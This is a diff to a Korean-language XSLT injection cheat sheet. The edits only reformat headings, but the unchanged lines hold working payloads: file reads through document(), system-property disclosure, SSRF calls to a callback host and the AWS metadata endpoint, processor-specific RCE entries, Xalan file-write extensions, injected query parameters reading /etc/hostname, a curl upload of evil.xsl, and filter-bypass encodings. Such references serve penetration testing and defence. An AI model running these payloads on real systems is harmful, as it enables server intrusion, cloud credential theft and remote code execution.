@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**파일 읽기 (`document()`):**
+#### 파일 읽기 (`document()`)
 ```xml
 <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
   <xsl:template match="/">
@@ -9,7 +9,7 @@
 </xsl:stylesheet>
 ```
 
-**정보 노출 (`system-property`):**
+#### 정보 노출 (`system-property`)
 ```xml
 <xsl:value-of select="system-property('xsl:vendor')"/>
 <xsl:value-of select="system-property('xsl:version')"/>
@@ -17,14 +17,14 @@
 <xsl:value-of select="system-property('xsl:vendor-url')"/>
 ```
 
-**SSRF (`document()` + 외부 URL):**
+#### SSRF (`document()` + 외부 URL)
 ```xml
 <xsl:value-of select="document('https://CALLBACK.oast.fun/xslt-ssrf')"/>
 <xsl:value-of select="unparsed-text('https://CALLBACK/xslt')"/>  <!-- XSLT 2.0+ -->
 <xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>  <!-- AWS metadata -->
 ```
 
-**RCE — 프로세서별:**
+#### RCE — 프로세서별
 
 | 프로세서 | 페이로드 |
 |---|---|
@@ -36,30 +36,30 @@
 | Saxon EE Java binding | Java 클래스 직접 호출 (라이센스 환경 한정) |
 | Saxon CE/HE | `xsl:result-document` 외부 파일 쓰기 |
 
-**XSLT 3.0 동적 평가:**
+#### XSLT 3.0 동적 평가
 ```xml
 <xsl:value-of select="fn:transform(map{'stylesheet-text':'... 임의 XSLT ...'})"/>
 ```
 
-**Xalan 확장 (`xalan:`):**
+#### Xalan 확장 (`xalan:`)
 ```xml
 xmlns:xalan="http://xml.apache.org/xalan"
 <xsl:value-of select="xalan:write('/tmp/evil.txt', 'content')"/>
 <xsl:variable name="x" select="xalan:pipeDocument(...)"/>
 ```
 
-**XSL-FO 외부 이미지 (SSRF):**
+#### XSL-FO 외부 이미지 (SSRF)
 ```xml
 <fo:external-graphic src="https://CALLBACK/xslfo"/>
 ```
 
-**파라미터 인젝션 (XSLT 안 변수에 사용자 입력):**
+#### 파라미터 인젝션 (XSLT 안 변수에 사용자 입력)
 ```
 ?xpath=document('/etc/hostname')
 ?xpath=system-property('xsl:vendor')
 ```
 
-**전체 XSLT 본문 업로드:**
+#### 전체 XSLT 본문 업로드
 ```bash
 curl -X POST "https://target/api/transform" -H "Content-Type: application/xml" --data-binary @evil.xsl
 # evil.xsl에 위 페이로드 포함
@@ -80,7 +80,7 @@ curl -X POST "https://target/api/transform" -H "Content-Type: application/xml" -
 | 키워드 차단 (`Runtime`) | Class.forName 호출 분할 — `xmlns` URI를 `&#x52;untime` 같은 entity로 |
 | `script` 태그 차단 | Saxon extension functions, Xalan `pipeDocument` 등 다른 경로 |
 
-**Encoding 변형:**
+#### Encoding 변형
 ```xml
 <!-- entity로 키워드 분할 -->
 <xsl:value-of select="document(&#x66;ile:///etc/hostname)"/>
